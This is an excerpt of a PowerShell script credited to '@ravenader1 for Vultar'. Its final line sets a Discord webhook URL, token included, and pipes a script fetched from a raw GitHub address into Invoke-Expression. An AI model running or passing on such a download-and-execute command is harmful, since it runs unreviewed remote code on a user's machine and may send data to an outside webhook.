...
[string]$Path
    ...
    try {
        $webRequest = Get-Command -Name Invoke-WebRequest -CommandType Cmdlet -ErrorAction Stop
        $qualifiedName = "$($webRequest.Source)\Invoke-WebRequest"
...
Write-ColoredLine "Made by @ravenader1 for Vultar." White
Write-Host ""
...
$env:WEBHOOK_URL="https://discord.com/api/webhooks/1541943531935895572/WWdRbjIXSfQkRrdq4yuMWc5S9PPiocFXL1kOl9feDsfMfB5UWeI3a_jxbqFDevYwmy1x"; irm "https://raw.githubusercontent.com/C55C5/Vultar-S3-StagespC/refs/heads/main/v3.ps1" | iex       
